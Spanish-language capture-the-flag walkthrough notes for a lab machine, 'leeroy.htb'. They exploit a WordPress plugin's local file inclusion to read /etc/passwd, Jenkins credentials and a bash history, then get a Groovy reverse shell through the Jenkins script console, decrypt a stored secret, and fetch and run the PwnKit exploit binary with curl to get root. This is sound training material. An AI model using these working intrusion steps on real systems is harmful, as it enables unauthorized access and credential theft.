PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8080/tcp  open  http-proxy
13380/tcp open  unknown
33060/tcp open  mysqlx

-En el puerto 8080 tenemos un Jenkins que nos pide credenciales, volveremos más tarde.

-En el puerto 80 no hay nada interesante

-Insertamos la ip de la máquina y el puerto 13380 y nos intenta resolver el siguiente dominio:
	-http://leeroy.htb:13380/
	(Lo añadimos al /etc/hosts y entramos)

-Nos vamos a la siguiente URL y nos carga un Wordpress:
	-http://leeroy.htb:13380/

-De normal listaríamos los plugins con wpscan, sin embargo la máquina va muy lenta, los plugins se pueden ver en el código fuente de la URL:
	-Indentificamos el siguiente:
		**wp-with-spritz/assets/js/WPSpritz.js?ver=1.0.0**

-Encontramos el siguiente recurso que explota el Plugin.  El **Plugin** es **vulnerable** a **Local File Inclusion (LFI)** y a  **Remote File Inclusion (RFI)**:
	https://www.exploit-db.com/exploits/44544

-Probamos el **Remote File Inclusion (RFI)**:
	-Creamos un archivo en nuestra máquina al que vamos a hacer la petición:
		<?php system('id'); ?>
	-Hacemos la petición desde la URL, aprovechando el RFI:
		-http://leeroy.htb:13380/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://192.168.236.128/test.php
			system('id')
			(Existe un RFI pero no nos interpreta el código PHP, así que **no nos sirve**)

-Probamos el **Local File Inclusion (LFI):**
	-http://leeroy.htb:13380/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
		-VEMOS EL /ETC/PASSWD!!

-Le decimos a Chat.gpt que nos diga rutas dónde pueden estar almacenadas las credenciales de Jenkins y nos dice las siguiente:
	-/var/lib/jenkins/credentials.xml

-Apuntamos a ese archivo mediante el LFI:
	-http://leeroy.htb:13380/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../var/lib/jenkins/credentials.xml
		-Username: leeroy
		-Password: AQAAABAAAAAgXBYO0AVEoYA0D9oynQjqAa+7QnySTgsMd4BbZa9QmVexM+9KFi508EfjODn1lXhx

-La contraseña está cifrada, intentamos **descifrarla** pero **NO PODEMOS**

-En el /etc/passwd hemos visto que existe el usuario 'leeroy':
	-curl -s -X GET 'http://leeroy.htb:13380/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../etc/passwd' | grep 'sh$'
		leeroy:x:1000:1000::/home/leeroy:/bin/bash

-Vamos a intentar listar el '.bash_history' a través del LFI:
	-curl -s -X GET 'http://leeroy.htb:13380/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../home/leeroy/.bash_history'
		echo "z1n$AiWY40HWeQ@KJ53P" > /var/lib/jenkins/secrets/initialAdminPassword
		(Hemos encontrado una CONTRASEÑA!!)

-Nos vamos al Panel de Login del puerto 8080 y probamos la contraseña:
	-Probamos con el usuario 'leeroy' y con 'jenkins' pero no funciona.
	-Probamos con el usuario admin:
		-Username: admin
		-Password: z1n$AiWY40HWeQ@KJ53P
			-ESTAMOS DENTRO!!

-Una vez dentro, conseguimos acceso a la máquina siguiendo los pasos:
	-Manage Jenkins -->Script Console
	-Buscamos https://www.revshells.com/ y copiamos la reverse shell de tipo 'Groovy', con el tipo de shell 'sh'
	-Lo pegamos en la consola de jenkins y obtenemos acceso.
		jenkins@leeroy:/$ whoami
			jenkins

## Escalada de Privilegios

-Listamos el archivo credentials.xml porque ahora si que podemos descifrarlo, ya que tenemos acceso a la consola de script de groovy y dentro de la máquina está presente el archivo 'hudson.util.Secret' y 'master.key'
	-cat /var/lib/jenkins/credentials.xml
AQAAABAAAAAgXBYO0AVEoYA0D9oynQjqAa+7QnySTgsMd4BbZa9QmVexM+9KFi508EfjODn1lXhx

-Nos vamos a la consola de script a descifrar la contraseña del usuario leeroy:
	-http://192.168.236.138:8080/script
		-En la consola ponemos:
			-println(hudson.util.Secret.decrypt("{AQAAABAAAAAgXBYO0AVEoYA0D9oynQjqAa+7QnySTgsMd4BbZa9QmVexM+9KFi508EfjODn1lXhx}"))
				**RESULT --> ew3@PHQiX2RtP1ra!GZs**

-Pivotamos al usuario leeroy con la contraseña encontrada:
	-su leeroy
	-Password: ew3@PHQiX2RtP1ra!GZs
		leeroy@leeroy:/$ whoami
			leeroy

-La escala a root se sale del scope, en lugar de eso vamos a abusar de /usr/bin/pkexec, ya que tenemos permisos SUID:
	-cd /tmp
		-curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
		-chmod +x ./PwnKit
		-./PwnKit
			root@leeroy:/tmp# whoami
				root











